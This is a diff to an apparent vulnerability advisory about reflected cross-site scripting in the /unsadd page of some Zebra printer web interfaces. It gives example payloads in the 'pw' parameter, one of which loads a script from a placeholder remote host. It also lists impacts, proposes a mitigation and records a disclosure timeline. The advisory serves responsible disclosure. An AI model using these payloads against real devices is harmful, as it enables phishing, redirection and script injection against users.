@@ -10,7 +10,9 @@ Known Vulnerable Versions:
 (NB: There are likely others and I did not have access to other devices to test them. These versions are older and the vulnerabilities may be fixed in a newer version. It may be prudent to check rather than to assume this does not apply to your printer model/version.)
 
 The Vulnerability:
-The identified printers have several reflected XSS vulnerabilities in them (which means that you generally need to trick someone into clicking a malicious link with an XSS payload in it to trigger the vulnerability). In addition to those that lethalcyanide identified, which are applicable to the versions that I have identified above, there is an additional XSS vulnerability in the /unsadd page of the web interface (which is used for setting up alerts). The "pw" field strangely incorporates the web interface password into the HTML of the page without any sanitization, making it possible to execute arbitrary JavaScript in the browser of a victim that clicks on a malicious link. Example payloads would be:
+The identified printers have several reflected XSS vulnerabilities in them (which means that you generally need to trick someone into clicking a malicious link with an XSS payload in it to trigger the vulnerability). 
+In addition to those that lethalcyanide identified, which are applicable to the versions that I have identified above, there is an additional XSS vulnerability in the /unsadd page of the web interface (which is used for setting up alerts). 
+The "pw" (password) field strangely incorporates the web interface password as entered by the user into the HTML of the page without any sanitization, making it possible to execute arbitrary JavaScript in the browser of a victim that clicks on a malicious link. Example payloads would be:
 --Alert Box:/unsadd?pw=%22%3E%3Cscript%3Ealert(%22zebra%20xss%22)%3C/script%3E%3C/html%3E%3C!--%22 
 --Redirect: /unsadd?pw="><script>window.location%3D"https%3a//www.google.com"</script> 
 --Remote Script: /unsadd?pw=%22%3E%3Cscript%20src%3Dhttp://<remote IP here>/<js file name here>.js%3E%3C/script%3E
@@ -21,6 +23,10 @@ An attacker may execute arbitary JavaScript in a victim's browser. An example of
 --Silently redirect the victim to an attacker-controlled server in service of a social engineering campaign or to induce the victim to download malware
 --Replace the intended page content or modify it so that intended data and functionality appear to be unavailable (which, since this is a reflected XSS vulnerability, can be rectified by browsing to a URL without the included payload
 --In niche/extreme cases, browser exploitation may be possible
+
+Mitigation:
+It is not clear that there is a reason a user's password should be incorporated into the page HTML at all, especially as this does not seem to properly serve as remember password functionality.
+Rather than try to fix this with input sanitization, this behavior should be eliminated entirely.
 
 Disclosure Timeline:
 This was disclosed to Zebra in January 2026. Multiple subsequent requests for permission to disclose in June 2026 went unanswered.
